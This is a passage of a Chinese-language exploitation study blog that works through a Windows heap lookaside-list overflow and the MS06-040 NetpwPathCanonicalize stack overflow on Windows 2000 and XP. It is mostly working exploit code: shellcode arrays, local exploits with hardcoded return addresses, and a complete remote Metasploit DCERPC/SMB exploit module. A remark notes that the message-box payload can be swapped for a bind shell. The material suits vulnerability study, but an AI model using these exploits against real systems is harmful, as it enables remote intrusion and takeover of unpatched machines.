#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\xEB\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x03\x00\x03\x00\x5C\x01\x08\x99"
"\xE4\xFF\x12\x00"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";


int main(int argc, char* argv[])
{
	HLOCAL h1,h2,h3;
	HANDLE hp;

	hp = HeapCreate(0,0,0);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);

	HeapFree(hp,0,h3);
	HeapFree(hp,0,h2);
	memcpy(h1,shellcode,300);

	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	memcpy(h3,"\x90\x1E\x3A\x00",4);

	int zero = 0;
	zero = 1/zero;
	printf("%d",zero);

	return 0;
}
```

OD附加上去, 单步到完成三次分配
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-001.png)

当释放h3, 快表头指向了h3
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-002.png)

当释放h2, 快表头->h2->h3, 后释放节点会优先链到接近快表头
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-003.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-004.png)

执行memcpy覆盖h2的Next指针
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-005.png)

再次请求分配16 byte, 快表优先把靠近快表头的h2分配出去, 造成快表头->0x0012FFE4
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-006.png)

当再请求分配时, 快表就把0x0012FFE4地址分配出去
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-007.png)

往h3指向地址写入shellcode地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-008.png)

触发异常, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x027-009.png)

当然, 不调试直接运行还是要将基址改成0x00390000


## 0x028 RPC入侵：MS06-040

>[分析环境]  
>系统: Windows 2000 sp4  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  

编译POC, 运行
```
#include"stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;

	HINSTANCE LibHandle;
	MYPROC Trigger;

	char dll[ ] = "./netapi32.dll";
	char VulFunc[ ] = "NetpwPathCanonicalize";
	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

	memset(path,0,sizeof(path));
	memset(path,'a',sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'b',sizeof(prefix)-2);
	
	(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
	FreeLibrary(LibHandle);

	return 0;
}
```

程序崩溃掉, OD附加上去, EIP被"aaaa"填充
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-001.png)

执行文件拖到OD, 单步来到call netapi32.NetpwPathCanonicalize, 再往下程序崩掉
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-002.png)

跟进NetpwPathCanonicalize函数, 执行MSVCRT.wcscat, 当retn时程序再次崩溃
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-003.png)

此处应该就是崩溃点, 在IDA定位到该函数
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-004.png)

copy"bbbbbb..."串到栈上
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-005.png)

"bbbbb..."串尾部拼接一个0x005C
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-006.png)

继续拼接"aaaaa..."串, 覆盖返回地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-007.png)

观察在retn时, ecx指向缓冲区的开始
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-008.png)

本地exploit，可以把shellcode布置在"bbbbbb...."串里, 用一条call/jmp ecx跳到栈上执行
```
// ms06_040_exp.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

char shellcode[]=
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;
	
	HINSTANCE LibHandle;
	MYPROC Trigger;

	char dll[] = "./netapi32.dll";
	char VulFunc[] = "NetpwPathCanonicalize";

	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

	memset(path,0,sizeof(path));
	memset(path,0x90,sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'a',sizeof(prefix)-2);
	memcpy(prefix,shellcode,113);

	path[0x318]=0xF9;		// call ecx
	path[0x319]=0x52;
	path[0x31A]=0x18;
	path[0x31B]=0x75;

	(Trigger)(path,can_path,maxbuf,prefix,&pathtype,0);
	FreeLibrary(LibHandle);

	return 0;
}
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-009.png)

远程exploit
```
##
# Author: wooy0ung
# Date:	2018/01/15
##

require 'msf/core'

module Metasploit3
  CachedSize = 200

  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Warning Box',
      'Description'   => 'Only for Version under Windows 7',
      'Author'        => [ 'wooy0ung' ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Payload'       =>
        {
          'Payload' =>
           	"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"+
		"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"+
		"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"+
		"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"+
		"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"+
		"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"+
		"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"+
		"\xd7"
        }
      ))
  end

end
```
以上是一段弹出警告框的payload，新建一个文本贴入以上代码，保存为warning.rb

```
##
# Author: wooy0ung
# Date:	2018/01/15
##

require 'msf/core'  

class Metasploit3 < Msf::Exploit::Remote  
	Rank = GoodRanking

	include Exploit::Remote::DCERPC
	include Exploit::Remote::SMB::Client

	def initialize(info = {})

		super(update_info(info,
			'Name'           =>     "MS06-040 RPC Exploit",
			'Description'    => 	'Only for Windows 2000 Professional sp0',
      		        'Author'         => 	[ 'wooy0ung' ],
			'Platform'       =>	"win",
			'DefaultOptions' =>	{'EXITFUNC' => 'thread',},
			'DefaultTarget'  => 	0,
			'Targets'        =>	[['Windows 2000 Professional sp0',  {'Ret' => [0x318 , 0x74FB62C3] }]]))

		register_options([OptString.new('SMBPIPE', [ true,  "The pipe name to use (BROWSER, SRVSVC)", 'BROWSER']),], self.class) 

	end

	def exploit

		connect()
		smb_login()

		handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188','3.0','ncacn_np',["\\#{datastore['SMBPIPE']}"])
		dcerpc_bind(handle)

		prefix = payload.encoded + make_nops(0x100 - payload.encoded.length - 2) + "\x00\x00"

		path = make_nops(0x318) + [target['Ret'][1]].pack('V') + 
		"\x04\xD0\xFD\x7F" * 5 +		# 可写地址(这里原本是崩溃函数传入的5个参数)
		"\x66\x81\xEC\x30\x04" +		# sub esp,430 (0x100 + 0x318 + 4 * 6 = 0x430 将esp指向payload起始)
		"\x8B\xC4" + 				# mov eax, esp
		"\xFF\xE4" +				# jmp esp
		"\x00\x00"				# Unicode结束符

		stub =	NDR.long(rand(0xffffffff)) +
			NDR.UnicodeConformantVaryingString('') +
			NDR.UnicodeConformantVaryingStringPreBuilt(path) +
			NDR.long(rand(250)+1) +
			NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +
			NDR.long(rand(250)+1) +
			NDR.long(0)	

		begin
  			dcerpc.call(0x1f, stub, false)
			rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			rescue => e
  			if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
    			  raise e
  			end
    	        end

	       handler
    	       disconnect

  	end  
end
```
以上则是利用脚本，保存为ms06_040.rb，主要是构造shellcode(在path做ROP，跳到prefix中执行payload)，在Windows 2000下利用起来比较容易，不再作解释

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-010.png)
选择之前保存的exp和payload，设置好靶机ip，pwn~

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-011.png)
当然，将普通弹框换成bind_shell的payload就可以拿到shell了~

exploit xp(sp0)，利用思路是：先调用一次NetpwPathCanonicalize()，此时栈上填充一部分数据但不足够溢出；再次调用NetpwPathCanonicalize()，而且此时不对栈数据初始化，将第二次的数据拼接上去。
```
#include "stdafx.h"
#include <windows.h>

typedef void (*MYPROC)(LPTSTR, char *, int, char *, long *, bool);

#define PATH1_SIZE      (0xc2*2)
#define PATH2_SIZE      (0x167*2)
#define OUTBUF_SIZE     0x440
#define PREFIX_SIZE     0x410

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"				// 放置一些垃圾数据防止压栈操作破坏payload
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main()
{	
	char PathName1[PATH1_SIZE];
	char PathName2[PATH2_SIZE];
	char Outbuf[OUTBUF_SIZE];
	int OutbufLen=OUTBUF_SIZE;
	char Prefix1[PREFIX_SIZE];
	char Prefix2[PREFIX_SIZE];
	long PathType1=44;
	long PathType2=44;
	
	HINSTANCE LibHandle;
	MYPROC Trigger;
	char dll[ ] = "./netapi32.dll"; 
	char VulFunc[ ] = "NetpwPathCanonicalize";

	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

    // fill PathName
	memset(PathName1,0,sizeof(PathName1));
	memset(PathName1,0,sizeof(PathName1));
	memset(PathName1,'a',sizeof(PathName1)-2);
	memcpy(PathName1,shellcode,sizeof(shellcode));

	memset(PathName2,0,sizeof(PathName2));
	memset(PathName2,0,sizeof(PathName2));
	memset(PathName2,'b',sizeof(PathName2)-2);

	PathName2[0x2AE] = 0xDA;		// call ecx   0x71BD03DA
	PathName2[0x2AF] = 0x03;
	PathName2[0x2B0] = 0xBD;
	PathName2[0x2B1] = 0x71;

	PathName2[0x2B2] = 0x10;		// 以下5个可写地址
	PathName2[0x2B3] = 0xF2;
	PathName2[0x2B4] = 0xFD;
	PathName2[0x2B5] = 0x7F;

	PathName2[0x2B6] = 0x10;
	PathName2[0x2B7] = 0xF2;
	PathName2[0x2B8] = 0xFD;
	PathName2[0x2B9] = 0x7F;

	PathName2[0x2BA] = 0x10;
	PathName2[0x2BB] = 0xF2;
	PathName2[0x2BC] = 0xFD;
	PathName2[0x2BD] = 0x7F;

	PathName2[0x2BE] = 0x10;
	PathName2[0x2BF] = 0xF2;
	PathName2[0x2C0] = 0xFD;
	PathName2[0x2C1] = 0x7F;

	PathName2[0x2C2] = 0x10;
	PathName2[0x2C3] = 0xF2;
	PathName2[0x2C4] = 0xFD;
	PathName2[0x2C5] = 0x7F;

    // set Prefix as a null string
	memset(Prefix1,0,sizeof(Prefix1));
	memset(Prefix2,0,sizeof(Prefix2));

    // call NetpwPathCanonicalize several times to overflow
	(Trigger)(PathName1,Outbuf,1        ,Prefix1,&PathType1,0);
	(Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&PathType2,0);

	FreeLibrary(LibHandle);

	return 0;
}
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-012.png)

看了metasploit的exploits模块里MS06-040的利用脚本，发现这个洞一直影响到XP和Server 2003版本。
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x028-013.png)